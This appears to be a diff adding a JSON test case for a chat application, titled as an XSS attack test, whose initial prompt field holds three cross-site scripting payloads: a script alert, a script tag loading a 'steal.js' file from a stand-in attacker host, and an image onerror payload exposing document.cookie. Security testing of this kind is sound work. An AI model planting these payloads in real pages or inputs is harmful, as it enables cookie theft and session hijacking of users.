@@ -1,0 +1,16 @@
+{
+  "caseId": "BASE_0015",
+  "title": "xss攻击",
+  "module": "未分类",
+  "priority": "P1",
+  "initialPrompt": "<script>alert('xss攻击')</script>\n<script src=\"http://hack.com/steal.js\"></script>\n<img src=x onerror=alert(document.cookie)>",
+  "preconditions": [],
+  "sourceSessionId": "0f5ecb43-3af1-4abf-9a1f-6eb7c08fc126",
+  "sourceSessionDir": "/Users/tabtin/Library/Application Support/TabTin/platform-data/organizations/06d00945-77d6-4ad1-bcaf-bbcd50467b84/spaces/0585e9ff-1120-45d5-b7f8-9d72360c0da6/conversations/sessions/0f5ecb43-3af1-4abf-9a1f-6eb7c08fc126",
+  "sourceRunId": "e01a4db5-3e91-4bab-9090-b788bdce2ce7",
+  "sourceRunIndex": 1,
+  "sourceCommit": "129f974f0eddd7a31524071ba110ae132f156d68",
+  "acceptedAt": "2026-07-06T12:19:13.397Z",
+  "acceptedBy": null,
+  "acceptanceSummary": ""
+}
